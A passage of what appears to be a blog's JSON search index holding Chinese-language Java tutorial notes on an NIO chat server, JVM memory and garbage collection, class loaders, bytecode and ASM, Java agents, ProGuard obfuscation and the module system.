java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class Server {\n\n    public static void main(String[] args) throws Exception {\n        int port = 8001;\n        //定义Selector\n        Selector selector = Selector.open();\n        //定义ServerSocketChannel\n        ServerSocketChannel socketChannel = ServerSocketChannel.open();\n        //设置非阻塞模式\n        socketChannel.configureBlocking(false);\n        //ServerSocketChannel绑定端口\n        socketChannel.socket().bind(new InetSocketAddress(port), 1024);\n        //注册事件为OP_ACCEPT\n        socketChannel.register(selector, SelectionKey.OP_ACCEPT);\n        //选择器轮询\n        while (true) {\n            System.out.println(\"Waiting...\");\n            //1000ms响应时间\n            selector.select(1000);\n            //获得感兴趣事件的SelectionKey\n            Set<SelectionKey> selectionKeySet = selector.selectedKeys();\n            Iterator<SelectionKey> iterator = selectionKeySet.iterator();\n\n            while (iterator.hasNext()) {\n                SelectionKey key = iterator.next();\n                iterator.remove();\n                try {\n                    //处理\n                    handleInput(selector, key);\n                } catch (Exception e) {\n                    if (key != null) {\n                        key.cancel();\n                        if (key.channel() != null) {\n                            key.channel().close();\n                        }\n                    }\n                }\n            }\n            try {\n                Thread.sleep(500);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public static void handleInput(Selector selector, SelectionKey key) throws IOException {\n        DateFormat normal = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        if (key.isValid()) {\n            //接收状态(收到客户端的连接请求)\n            if (key.isAcceptable()) {\n                ServerSocketChannel serverSocketChannel = (ServerSocketChannel) key.channel();\n                //接收客户端的连接\n                SocketChannel socketChannel = serverSocketChannel.accept();\n                //设置非阻塞模式\n                socketChannel.configureBlocking(false);\n                //注册事件为READ\n                socketChannel.register(selector, SelectionKey.OP_READ);\n                System.out.println(normal.format(new Date())+\" Connecting successfully \" + socketChannel.socket().getInetAddress() + \":\" + socketChannel.socket().getPort());\n            }\n            //可读状态(收到客户端的数据)\n            if (key.isReadable()) {\n                SocketChannel socketChannel = (SocketChannel) key.channel();\n                ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                //读取socketChannel中的数据\n                int readBytes = socketChannel.read(byteBuffer);\n                if (readBytes > 0) {\n                    //写入buffer->读取buffer\n                    byteBuffer.flip();\n                    byte[] bytes = new byte[byteBuffer.remaining()];\n                    byteBuffer.get(bytes);\n                    String message = new String(bytes, \"UTF-8\");\n                    System.out.println(normal.format(new Date()) + \" Receive from \" + socketChannel.socket().getInetAddress() + \":\" + socketChannel.socket().getPort() + \"  Message:\" + message);\n                    //群发操作\n                    broadcastClient(message, selector, socketChannel);\n                } else if (readBytes < 0) {\n                    key.cancel();\n                    socketChannel.close();\n                }\n            }\n        }\n    }\n\n    private static void broadcastClient(String message, Selector selector, SocketChannel socketChannel) throws IOException {\n        //获得所有连接中的key\n        Set<SelectionKey> keys = selector.keys();\n        Iterator<SelectionKey> iterator = keys.iterator();\n        while (iterator.hasNext()) {\n            SelectionKey key = iterator.next();\n            //如果不是发送端Socket,则向其群发\n            if (key.channel() != socketChannel && key.channel() instanceof SocketChannel) {\n                ((SocketChannel) key.channel()).write(Charset.forName(\"UTF-8\").encode(message));\n            }\n        }\n    }\n}\n```","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"JVM内存管理","url":"/reimu-lighthouse/20210922/java-jvm/","content":"## **1.JVM概述**\n### **虚拟机：VM, Virtual Machine**\n- 逻辑上，一台虚拟的计算机\n- 实际上，一个软件，能够执行一系列虚拟的计算指令\n- 系统虚拟机\n    - 对物理计算机的仿真\n    - 如VMWare，Oracle VirtualBox等 \n- 软件虚拟机\n    - 专门为单个计算程序而设计\n    - 如JVM等\n\n## **2.JVM内存分类**\n- 线程私有内存\n    - 程序计数器(Program Counter Register)\n    - Java虚拟机栈(JVM Stack)\n    - 本地方法栈(Native Method Stack)\n- 多线程共享内存\n    - 堆(Heap)\n    - 方法区(Method Area)\n        - 运行时常量池\n\n### **程序计数器**\n- Program Counter Register, **一块小内存，每个线程都有**\n- PC存储当前方法\n    - 线程正在执行的方法称为该线程的当前方法\n- 当前方法为本地(native)方法时, pc值未定义(undefined)\n- 方法为非本地方法时，pc包含了当前正在执行指令的地址\n- 不会引发OutOfMemoryError异常\n\n###  **JVM 栈(JVM Stack，Java 栈)** \n- 线程有自己独立的Java虚拟机栈，**线程私有**\n- **-Xss设置每个线程堆栈大小**\n- Java方法的执行基于栈\n    - 每个方法从调用到完成对应一个栈帧在栈中入栈、出栈的过程\n        - 栈帧存储局部变量表、操作数栈等\n        - **局部变量表存放方法中存在“栈”里面的东西**\n- 引发的异常\n    - 栈的深度超过虚拟机规定深度，StackOverflowError异常\n    - 无法扩展内存，OutOfMemoryError异常\n\n### **本地方法栈(Native Method Stacks)**\n- 存储native方法的执行信息，**线程私有**\n- **VM规范没有对本地方法栈做明显规定**\n- 引发的异常\n    - 栈的深度超过虚拟机规定深度，StackOverflowError异常\n    - 无法扩展内存，OutOfMemoryError异常\n\n### **堆(Heap)**\n- 虚拟机启动时创建，**所有线程共享，占地最大**\n- 对象实例和数组都是在堆上分配内存\n- 垃圾回收的主要区域\n- 设置大小\n    - -Xms 初始堆值，-Xmx最大堆值\n- 引发的异常\n    - 无法满足内存分配要求，OutOfMemoryError异常\n\n### **方法区(Method Area)**\n- 存储JVM已经加载类的结构，**所有线程共享**\n    - 运行时常量池、类信息、常量、静态变量等\n- JVM启动时创建，逻辑上属于堆(Heap)的一部分\n- 很少做垃圾回收\n- 引发的异常\n    - 无法满足内存分配要求， OutOfMemoryError异常\n\n### **运行时常量池(Run-Time Constant Pool)**\n- Class文件中常量池的运行时表示\n- 属于方法区的一部分\n- 动态性\n    - Java语言并不要求常量一定只有在编译期产生\n    - 比如String.intern方法\n- 引发的异常\n    - 无法满足内存分配要求，OutOfMemoryError异常\n\n|名称|线程私有/共享|功能|大小|异常|\n|-|-|-|-|-|\n|程序计数器|私有|保存当前线程执行方法|通常固定大小|不会|\nJVM栈|私有|方法的栈帧|-Xss StackOverflowError|OutOfMemoryError|\n本地方法栈|私有|存储native方法信息|通常固定大小|StackOverflowErro、OutOfMemoryError\n堆|共享|存储对象和数组|-Xms|初始堆值|-Xmx最大堆值|OutOfMemoryError\n方法区|共享|存储类结构/常量/静态变量|-XX参数设置|OutOfMemoryError\n运行时常量池|共享|常量池运行时表示|从属于方法区|OutOfMemoryError\n\n## **3.JVM内存参数**\n- 堆(Heap)\n    - 共享，内存大户，存储所有的对象和数组\n    - -Xms 初始堆值，-Xmx最大堆值\n- JVM 栈(JVM Stack)\n    - 线程私有，存储类中每个方法的内容\n    - -Xss 最大栈值\n- 方法区 (Method Area)\n    - 存储类信息、常量池等\n    - 1.7及以前，永久区(Perm)，-XX:PermSize, -XX:MaxPermSize\n    - 1.8及以后，元数据区，-XX:MetaspaceSize, -XX:MaxMetaspaceSize\n\n## **4.Java对象引用**\n### **Java对象的生命周期**\n- 对象通过构造函数创建，但是没有析构函数回收内存\n- 对象存活在离它最近的一对大括号中\n\n### **内存回收API**\n- Object的finalize方法，垃圾收集器在回收对象时调用，有且仅被调\n用一次\n- System的gc方法，运行垃圾收集器\n\n- 基于对象引用判定无用对象\n    - 零引用，互引用等\n- 对象引用链\n    - 通过一系列的称为\"GC Roots\"的对象作为起始点，从这些节点开始向下搜索，搜索所走过的路径称为引用链（Reference Chain），当一个对象到GC Roots没有任何引用链相连（用图论的话来说，就是从GC Roots到这个对象不可达）时，则证明此对象是不可用的\n- GC Roots对象包括\n    - 虚拟机栈中引用的对象\n    - 方法区中类静态属性引用的对象\n    - 方法区中常量引用的对象\n    - 本地方法栈中引用的对象\n\n- 强引用\n    - 例如Object obj = new Object(); Object obj2 = obj;\n    - 只要强引用还存在，对象就不会被回收，哪怕发生OOM异常\n- 软引用\n    - 描述有用但并非必需的对象\n    - 在系统将要发生内存溢出异常之前，会把这些对象列为可回收\n    - JDK提供了SoftReference类来实现软引用\n    ```java\n    SoftReference<StringBuilder> s2 = new SoftReference<StringBuilder>(s1);\n    ```\n- 弱引用\n    - 描述非必需对象，比软引用强度更弱些\n    - 被弱引用关联的对象只能生存到下一次垃圾收集发生之前\n    - JDK提供了WeakReference类来实现弱引用\n    ```java\n    SoftReference<StringBuilder> s2 = new SoftReference<StringBuilder>(s1);\n    ```\n- 虚引用\n    - 最弱的引用关系，JDK提供PhantomReference实现虚引用\n    - 为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知，用于对象回收跟踪\n    ```java\n    PhantomReference<StringBuilder> s2 = new PhantomReference<StringBuilder>(s1);\n    ```\n\n|引用类型|强引用|软引用|弱引用|虚引用|\n|-|-|-|-|-|\n|类型|正常赋值|SoftReference|WeakReference|PhantomReference\n|回收时间|不回收|内存紧张时回收|GC就回收|随时可能被回收\n\n\n## **5.垃圾收集算法**\n### **引用计数法**\n- 一种古老的算法\n- 每个对象都有一个引用计数器\n- 有引用，计数器加一，当引用失效，计数器减一\n- 计数器为0的对象，将被回收\n- 优点\n    - 简单，效率高\n- 缺点\n    - 无法识别对象之间相互循环引用\n\n### **标记-清除**\n- 标记阶段：标记出所有需要回收的对象\n- 回收阶段：统一回收所有被标记的对象\n- 优点\n    - 简单\n- 缺点\n    - 效率不高\n    - 内存碎片\n\n### **复制算法**\n- 将可用内存按容量划分为大小相等的两块，每次只使用其中的一块\n- 当这一块的内存用完了，就将还存活着的对象复制到另外一块上面\n- 然后再把已使用过的内存空间一次清理掉\n- 优点\n    - 简单、高效\n- 缺点\n    - 可用内存减少\n    - 对象存活率高时复制操作较多\n\n### **标记-整理**\n- 标记阶段：与“标记-清除”算法一样\n- 整理阶段：让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存\n- 优点\n    - 避免碎片产生\n    - 无需两块相同内存\n- 缺点\n    - 计算代价大，标记清除+碎片整理s –更新引用地址\n\n### **分代收集**\n- Java对象的生命周期不同，有长有短\n- 根据对象存活周期，将内存划分新生代和老年代\n- 新生代(Young Generation)\n    - 主要存放短暂生命周期的对象\n    - 新创建的对象都先放入新生代，大部分新建对象在第一次gc时被回收\n- 老年代(Tenured Generation)\n    - 一个对象经过几次gc仍存活，则放入老年代\n    - 这些对象可以活很长时间，或者伴随程序一生，需要常驻内存的，可以减少回收次数\n\n### **分代收集**\n- 针对各个年代特点采用合适的收集算法\n    - 新生代 复制算法\n    - 老年代 标记清除或标记整理\n\n## **6.JVM堆内存参数设置**\n- -Xms初始堆大小\n- -Xmx最大堆大小\n- -Xmn新生代大小\n- -XX:SurvivorRatio设置eden区/from(to)的比例\n- -XX:NewRatio设置老年代/新生代比例\n- -XX:+PrintGC/-XX:+PrintGCDetails 打印GC的过程信息\n\n### **HotSpot现有垃圾收集器(JDK 13)**\n- 串行收集器(Serial Collector)\n- 并行收集器(Parallel Collector)\n- CMS收集器(Concurrent Mark Sweep Collector)\n- G1收集器(Garbage-First Collector)\n- Z收集器(Z Garbage Collector)\n","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 类加载器","url":"/reimu-lighthouse/20210922/java-classloader/","content":"## **1.类加载机制**\n### **类加载器ClassLoader**\n- 负责查找、加载、校验字节码的应用程序\n- java.lang.ClassLoader\n    - load(String className) 根据名字加载一个类，返回类的实例\n    - defineClass(String name, byte[] b, int off, int len) 将一个字节流定义一个类\n    - findClass(String name) 查找一个类\n    - findLoadedClass(String name) 在已加载的类中，查找一个类\n    - **成员变量 ClassLoader parent**\n\n### **JVM四级类加载器**\n- **启动类加载器(Bootstrap)，系统类rt.jar**\n- **扩展类加载器(Extension)，jre/lib/ext**\n- **应用类加载器(App)，classpath**\n- 用户自定义加载器(Plugin)，程序自定义\n\n### **类加载器双亲委托**\n- 首先判断是否已经加载\n- 若无，找父加载器加载\n- 若再无，由当前加载器加载\n\n## **2.双亲委托加载扩展**\n- Java严格执行双亲委托机制\n    - 类会由最顶层的加载器来加载，如没有，才由下级加载器加载\n    - 委托是单向的，确保上层核心的类的正确性\n    - **但是上级类加载器所加载的类，无法访问下级类加载器所加载的类**\n        - 例如，java.lang.String 无法访问自定义的一个Test类 \n        - Java是一个遵循契约设计的程序语言，核心类库提供接口，应用层提供实现\n        - 核心类库是BootstrapClassLoader加载\n        - 应用层是AppClassLoader加载\n        - 典型例子是JDBC和XML Parser等\n\n### **双亲委托的补充**\n- 执行Java，添加虚拟机参数-Xbootclasspath/a:path，将类路径配置为Bootstrap等级\n- 使用ServiceLoader.load方法，来加载(底层加载器所加载的类)\n\n### **ServiceLoader**\n- JDK 6引入的一种新特性，是用于加载服务的一种工具\n- 服务有接口定义和具体的实现类(服务提供者) \n- **SPI机制**，Service Provider Interface\n- 一个服务提供者会在jar包中有META-INF/services目录，里面放一个文件，名字同接口名字。内容的每一行都是接口的一个实现类\n- load方法，可以用**当前线程的类加载器**来获取某接口的所有实现，当然也都是转为接口类来使用\n- **注意：此服务和Java 9模块系统的服务略有差别，但是都能通过ServiceLoader进行加载**\n\n## **3.自定义类加载路径**\n### **自定义类加载器**\n- 自定义加载路径\n    - 弥补类搜索路径静态的不足\n    - URLClassLoader, 从多个URL(jar或者目录)中加载类\n- 自定义类加载器\n    - 继承ClassLoader类 \n    - 重写findClass(String className)方法\n\n### **自定义加载路径**\n- 弥补类搜索路径静态的不足\n- 前3个加载的路径都是运行前确定的\n- Java提供URLClassLoader\n    - 程序运行时修改类的加载路径\n    - 可从多个来源中加载类\n\n### **URLClassLoader**\n- 继承于ClassLoader\n- 程序运行时增加新的类加载路径\n- 可从多个来源中加载类\n    - 目录\n    - jar包 \n    - 网络\n- addURL添加路径\n- close方法关闭\n```java\n//URL支持http, https, file, jar 四种协议\nURL url = new URL(\"file:E:/java/source/PMOOC11-03-First/bin/\");\n//URL url = new URL(\"file:C:/Users/Tom/Desktop/PMOOC11-03-First.jar\");\n\n//程序运行时，添加一个classpath路径\nURLClassLoader loader = new URLClassLoader(new URL[]{url});\nClass<?> c = loader.loadClass(\"edu.ecnu.Hello\");\n\n//采用反射调用\nMethod m = c.getMethod(\"say\");\nm.invoke(c.newInstance());\n```\n\n## **4.自定义类加载器**\n- 继承ClassLoader类 \n- **重写findClass(String className)方法**\n- 使用时，默认先调用loadClass(className)来查看是否已经加载过，然后委托双亲加载，如果都没有，再通过findClass加载返回\n    - 在findClass中，首先读取字节码文件\n    - 然后，调用defineClass(className, bytes, off, len) 将类注册到虚拟机中\n    - 可以重写loadClass方法来突破双亲加载\n- 同一个类可以被不同层级的加载器加载，且作为2个类对待\n```java\nclass CryptoClassLoader extends ClassLoader \n{\n   private int key = 3; \n   \n   public Class<?> findClass(String name) throws ClassNotFoundException\n   {\n      try\n      {\n         byte[] classBytes = null;\n         //读取Hello.caesar文件，得到所有字节流\n         classBytes = loadClassBytes(name);\n         //调用defineClass方法产生一个类，并在VM中注册\n         Class<?> cl = defineClass(name, classBytes, 0, classBytes.length);\n         if (cl == null) throw new ClassNotFoundException(name);\n         return cl;\n      }\n      catch (IOException e)\n      {\n         throw new ClassNotFoundException(name);\n      }\n   }\n\n   /**\n    * Loads and decrypt the class file bytes.\n    * @param name the class name\n    * @return an array with the class file bytes\n    */\n   private byte[] loadClassBytes(String name) throws IOException\n   {\n      String cname = \"E:/java/source/PMOOC11-04/bin/edu/ecnu/Hello.caesar\";\n      byte[] bytes = Files.readAllBytes(Paths.get(cname));\n      for (int i = 0; i < bytes.length; i++)\n         bytes[i] = (byte) (bytes[i] - key);\n      return bytes;\n   }\n}\n```\n","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 字节码","url":"/reimu-lighthouse/20210922/java-bytecode/","content":"## **1.字节码概述**\n- class文件：字节码(bytecode)文件\n    - class文件是Java“一次编译，到处运行”的基础\n    - class文件具备平台无关性，由JVM执行\n    - 每个class文件包含了一个类或接口或模块的定义\n    - class文件是一个二进制文件，由JVM定义class文件的规范\n    - 任何满足这种规范的class文件都会被JVM加载运行\n    - class文件可以由其他语言编译生成，甚至不用程序语言直接生成\n    - JDK版本不同，所编译出.class文件略有不同\n\n## **2.字节码文件构成**\n### **class文件构成**\n- 采用类似于C语言结构体的结构来表示数据\n- 包括两种数据类型\n    - 定长数据：无符号数，u1, u2, u4 (分别代表1个字节、2个字节、4个字节的无符号数) \n    - 不定长数据：由多个无符号数组成，通常在数据的前面给出其长度\n\n### **魔数**\n- 前4个字节为魔数，十六进制表示为0xCAFEBABE，标识该文件为class文件\n\n### **版本号**\n- 第5、6字节表示次版本号\n- 7、8字节表示主版本号\n- 主版本号与JDK版本有映射关系\n\n### **常量池**\n- 常量池主要存放两大类常量\n- 字面量\n    - 如文本字符串、final的常量值等\n- 符号引用\n    - 类和接口的全限定名\n    - 字段的名称和描述符\n    - 方法的名称和描述符\n\n### **访问标志**\n- 常量池结束之后的两个字节，描述该Class是类还是接口，以及是否被public、abstract、final等修饰符修饰\n\n### **类索引、父类索引与接口索引集合**\n- 类索引\n    - 访问标志后的两个字节，描述的是当前类的全限定名\n    - 这两个字节保存的值为常量池中的索引值，根据索引值就能在常量池中找到这个类的全限定名\n- 父类索引\n    -当前类名后的两个字节，描述父类的全限定名，同上，保存的也是常量池中的索引值\n- 接口索引集合\n    - 父类名称后为两字节的接口计数器，描述了该类或父类实现的接口数量\n    - 紧接着的n个字节是所有接口名称的字符串常量的索引值\n\n### **字段表**\n- 字段表用于描述类和接口中声明的变量，包含类级别的变量以及实例变量，但是不包含方法内部声明的局部变量\n- 字段表也分为两部分，第一部分为两个字节，描述字段个数；第二部分是每个字段的详细信息fields_info\n- 方法部分属性\n    - Code，源代码对应的JVM指令操作码\n    - LineNumberTable，行号表，将Code区的操作码和源代码中的行号对应\n\n### **方法表**\n- 字段表结束后为方法表，方法表也是由两部分组成，第一部分为两个字节描述方法的个数\n- 第二部分为每个方法的详细信息。方法的详细信息较为复杂，包括方法的访问标志、方法名、方法的描述符以及方法的属性\n\n### **附加属性**\n- 字节码的最后一部分，该项存放了在该文件中类或接口所定义属性的基本信息\n- 属性信息相对灵活，编译器可自由写入属性信息，JVM会忽略不认识的属性信息\n\n## **3.字节码指令分类**\n### **字节码分类**\n- 加载和存储指令\n    - 用于将数据在栈帧中的局部变量表和操作数栈之间来回传输\n    - 将一个局部变量加载到操作栈：iload、lload、fload、dload、aload等 \n    - 将一个数值从操作数栈存储到局部变量表：istore、lstore、fstore、dstore、astore等 \n    - 将一个常量加载到操作数栈：bipush、sipush、ldc、ldc_w、ldc2_w、aconst_null、iconst_m1等\n- 运算指令\n    - iadd、isub、imul、idiv等 \n- 类型转换指令\n    - i2b、i2l、i2s等 \n- 对象/数组创建与访问指令\n    - new、newarray、getfield等 \n- 操作数栈管理指令\n    - pop、dup等\n- 控制转移指令\n    - Ifeq、goto等 \n- 方法调用和返回指令\n    - invokevirtual、ireturn等 \n- 异常处理指令\n    - athrow\n- 同步控制指令\n    - monitorenter、monitorexit\n\n### **字节码指令简介**\n- JVM指令由操作码和零至多个操作数组成\n    - 操作码（OpCode，代表着某种特定操作含义的数字）\n    - 操作数（Operand，操作所需参数）\n- JVM的指令集是基于栈而不是寄存器\n    - 字节码指令控制的是JVM操作数栈\n\n## **4.字节码操作ASM**\n- 字节码操作：指令层次较为复杂\n- 很多第三方字节码工具包\n    - https://www.open-open.com/project/tag/zijie-ma-caozuo.html\n- ASM是生成、转换、分析class文件的工具包\n    - https://asm.ow2.io/\n    - 体积小、轻量、快速、文档完善，被众多开源项目采用\n        - Groovy/Kotlin Compiler\n        - Gradle\n        - Jacoco //代码覆盖率统计\n        - Mockito // Java Test Mock框架\n\n### **ASM API**\n- Core API\n    - 类比解析XML文件中的SAX方式\n    - 不需要读取类的整个结构，使用流式的方法来处理字节码文件\n    - 非常节约内存，但是编程难度较大\n    - 出于性能考虑，一般情况下编程都使用Core API\n- Tree API\n    - 类比解析XML文件中的DOM方式，把整个类的结构读取到内存中\n    - 消耗内存多，但是编程比较简单\n    - 通过各种Node类来映射字节码的各个区域\n\n### **ASM API 核心类**\n- 核心类\n    - ClassReader 用于读取已经编译好的.class文件\n    - ClassWriter 用于重新构建编译后的类\n        - 如修改类名、属性以及方法，也可以生成新的类的字节码文件\n- Visitor类 \n    - CoreAPI根据字节码从上到下依次处理\n    - 对于字节码文件中不同的区域有不同的Visitor\n        -  MethodVisitor 用于访问类方法\n        -  FieldVisitor 访问类变量\n        -  AnnotationVisitor 用于访问注解\n```java\n//修改字节码文件\npublic class MyClassVisitor extends ClassVisitor implements Opcodes {\n    private static String methodName;\n\n    public MyClassVisitor(ClassVisitor cv) {\n        super(ASM5, cv);\n    }\n\n    @Override\n    public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {\n        cv.visit(version, access, name, signature, superName, interfaces);\n    }\n\n    @Override\n    public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {\n        MethodVisitor mv = cv.visitMethod(access, name, desc, signature, exceptions);\n        // 忽略构造方法\n        if (!name.equals(\"<init>\") && mv != null) {\n            methodName = name;\n            mv = new MyMethodVisitor(mv);\n        }\n        return mv;\n    }\n\n    class MyMethodVisitor extends MethodVisitor implements Opcodes {\n        public MyMethodVisitor(MethodVisitor mv) {\n            super(Opcodes.ASM5, mv);\n        }\n        \n        public void visitCode() {\n            super.visitCode();\n            //方法进入时打印信息\n            //拿到java.lang.System类的.out static字段，并放入栈顶\n            mv.visitFieldInsn(GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\");\n            // 将待输出信息放入栈顶\n            mv.visitLdcInsn(\"method \" + methodName + \" is starting\");\n            //调用println方法\n            mv.visitMethodInsn(INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false);\n        }\n\n        public void visitInsn(int opcode) {\n            // 判断return或抛出异常\n            if ((opcode >= Opcodes.IRETURN && opcode <= Opcodes.RETURN) || opcode == Opcodes.ATHROW) {\n                mv.visitFieldInsn(GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\");\n                mv.visitLdcInsn(\"method \" + methodName + \" is ending\");\n                mv.visitMethodInsn(INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false);\n            }\n            mv.visitInsn(opcode);\n        }\n    }\n}\n```\n\n```java\n//生成字节码文件\npublic class Generator {\n\n    public static void main(String[] args) throws Exception {\n        modifyGreeting();\n        createAsmGreeting();\n    }\n\n    public static void modifyGreeting() throws IOException {\n        // 读取\n        ClassReader classReader = new ClassReader(\"com/test/Greeting\");\n        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_MAXS);\n        // 处理\n        ClassVisitor classVisitor = new MyClassVisitor(classWriter);\n        classReader.accept(classVisitor, ClassReader.SKIP_DEBUG);\n        byte[] data = classWriter.toByteArray();\n        // 输出\n        File f = new File(\"target/classes/com/test/Greeting.class\");\n        FileOutputStream fout = new FileOutputStream(f);\n        fout.write(data);\n        fout.close();\n        System.out.println(\"Modify Greeting Class success!!!!!\");\n    }\n\n    public static void createAsmGreeting() throws Exception {\n\n        ClassWriter cw = new ClassWriter(0);\n        MethodVisitor mv;\n        //主版本号设为49，JDK5之后都可以运行\n        cw.visit(49, Opcodes.ACC_PUBLIC + Opcodes.ACC_SUPER, \"com/test/AsmGreeting\", null, \"java/lang/Object\", null);\n\n        cw.visitSource(\"AsmGreeting.java\", null);\n\n        // 无参构造方法\n        mv = cw.visitMethod(Opcodes.ACC_PUBLIC, \"<init>\", \"()V\", null, null);\n        mv.visitVarInsn(Opcodes.ALOAD, 0); // 将this放入栈顶\n        \n        //调用super()\n        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, \"java/lang/Object\", \"<init>\", \"()V\", false);\n        mv.visitInsn(Opcodes.RETURN);\n        mv.visitMaxs(1, 1);\n        mv.visitEnd();\n\n        // hello方法，无参无返回值\n        mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, \"hello\", \"()V\", null, null);\n        mv.visitFieldInsn(Opcodes.GETSTATIC, \"java/lang/System\", \"out\", \"Ljava/io/PrintStream;\");\n        mv.visitLdcInsn(\"Hello, this class is genrated by ASM\");\n        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, \"java/io/PrintStream\", \"println\", \"(Ljava/lang/String;)V\", false);\n        mv.visitInsn(Opcodes.RETURN);\n        mv.visitMaxs(2, 1);\n        mv.visitEnd();\n\n        cw.visitEnd();\n        \n        \n        File f = new File(\"target/classes/com/test/AsmGreeting.class\");\n        FileOutputStream fout = new FileOutputStream(f);\n        fout.write(cw.toByteArray());\n        fout.close();\n        System.out.println(\"Create AsmGreeting success!!!!!\");\n    }\n}\n```\n\n## **5.字节码增强**\n- 字节码操作：通常在字节码使用之前完成\n    - 源码、编译、(字节码操作)、运行\n- 字节码增强：运行时对字节码进行修改/调换\n    - Java ClassLoader类加载器\n    - **Java Instrument**\n\n### **Java Instrument**\n- JDK 5 引入，java.lang.instrument包\n- 对程序的替换，都是通过代理程序(javaagent)进行\n- premain：支持在main函数之前，对类的字节码进行修改/替换\n- agentmain：支持在程序运行过程中，对字节码进行替换\n\n### **Java 运行前代理**\n- **在main函数运行之前，修改/替换某类的字节码**\n- 启动Java程序时，给java.exe增加一个参数**javaagent:someone.jar**\n- 在**someone.jar**的清单文件(manifest)指定了**Premain-Class:SomeAgent**\n- **SomeAgent**类中，有一个**premain**方法，此方法先于main运行\n- **premain**方法有一个**Instrumentation**的形参，可以调用**addTransformer**方法，增加一个**ClassTransformer**转换类\n- 自定义一个**ClassTransformer**类 ，重写**tranform**方法，修改/替换字节码\n\n### **Java 运行时代理**\n- **在main函数运行时，修改某类的字节码**\n    - Test调用Greeting类工作\n- 编写**AttachToTest**类，对Test进程附加一个**agent(jar)**\n- 在jar中，利用**Instrument对Greeting**类进行**retransformClasses**，重新加载\n- 对进程附加agent，是JVMTI的技术\n    - JVM Tool Interface\n\n### **类替换的注意事项**\n- 可以修改方法体和常量池\n- 不可以增加、修改成员变量/方法定义\n- 不可以修改继承关系\n- 未来版本还会增加限制条件\n\n## **6.字节码混淆**\n### **Java字节码的弱点**\n - Java 字节码文件机制\n- .java文件是程序源码，是程序员智慧劳动的结晶，需要保护\n- 字节码文件是程序运行的主体，遵守JVM的规范，且被分发使用\n- 为了各种需要，产生出很多反编译工具，从字节码恢复源码\n    - javap， JDK自带的，可以解析出(可阅读的)字节码\n    - Jad, https://varaneckas.com/jad/, 历史最老\n    - JD(Java Decompiler, http://java-decompiler.github.io/) \n    - Procyon, https://bitbucket.org/mstrobel/procyon/src/default/\n        - Luyten, GUI版本，https://github.com/deathmarine/Luyten\n    - CRF， http://www.benf.org/other/cfr/\n\n### **Java字节码的保护**\n- 字节码保护\n    - 字节码加密\n        - 对字节码进行加密，不再遵循JVM制定的规范\n        - JVM加载之前，对字节码解密后，再加载\n- **字节码混淆**\n    - **被混淆的代码依然遵循JVM制定的规范**\n    - **变量命名和程序流程上进行等效替换，使得程序的可读性变差**\n    - **代码难以被理解和重用，达到保护代码的效果**\n\n### **ProGuard**\n- 最著名的Java字节码混淆器\n- https://www.guardsquare.com/en/products/proguard\n- 除了混淆，也具有代码压缩、优化、预检等功能\n- 可以命令行运行，也可以集成到Eclipse等IDE中使用\n- 不仅可以处理Java代码，也可以处理Android的代码\n- ProGuard核心配置文件\n    - ignorewarnings 跳过警告\n    -  -verbose 显示所有日志\n    - -injars 需要转化的对象地址\n    - -outjars 输出的地址\n    - -libraryjars <java.home>/lib/rt.jar 用到的支持库\n    - -printmapping proguard.map 指定自定义的混淆用的映射文件\n    - -dontshrink 不压缩，保持项目原有类和方法，仅对命名及内容进行混淆\n    -  -keepclassmembers public class * {void set*(*** );*** name;}\n        - **不混淆指定匹配的内容，匹配到的内容所属类名依旧会被混淆**\n    - -keepclasseswithmembers\n        - **与上面对应，这一项会让匹配到的内容所属类名也不被混淆**\n    - -keep public class Proguard { void main(java.lang.String[]);}\n        - **不混淆指定类及指定其中的成员及方法**\n\n### **ProGuard注意事项**\n- 反射调用类或者方法，可能失败\n- 对外接口的类和方法，不要混淆，否则调用失败\n- 嵌套类混淆，导致调用失败\n- native的方法不要混淆\n- 枚举类不要混淆\n- ......","tags":["Java"],"categories":["Java","Java高阶"]},{"title":"Java 模块化","url":"/reimu-lighthouse/20210922/java-modularization/","content":"## **1.模块化概述**\n### **Jar Hell**\n- jar文件无法控制别人访问其内部的public的类\n- 无法控制不同jar包中，相同的类名(包名+类名) \n- Java运行时，无法判定classpath路径上的jar中有多少个不同版本的文件。Java加载第一个符合名字的类\n- Java运行时，无法预判classpath路径上是否缺失了一些关键类\n\n### **模块化系统**\n- 模块化必须遵循的三个原则\n    - 强封装性：一个模块必须能够对其他模块隐藏其部分代码\n    - 定义良好的接口：模块必须向其他模块公开定义良好且稳定的接口\n    - 显式依赖：明确一个模块需要哪些模块的支持才能完成工作\n\n### **Jigsaw 拼图**\n- Java 9开始引入新的模块化系统：Jigsaw 拼图\n- **以模块(module)为中心**\n- 对JDK 本身进行模块化\n- 提供一个应用程序可以使用的模块系统\n- 优点\n    - 可靠的配置\n    - 强封装性\n    - 可扩展开发\n    - 安全性\n    - 性能优化\n\n## **2.模块创建和运行**\n### **Java Jigsaw**\n- 自Java 9 推出，以模块为中心\n- 在模块中，仍以包-类文件结构存在\n- 每个模块中，都有一个module-info.java\n    -  说明这个模块依赖哪些其他的模块，输出本模块中哪些内容\n```java\nmodule java.prefs {\n    requires java.xml;\n    \n    exports java.util.prefs;\n}\n```\n\n### 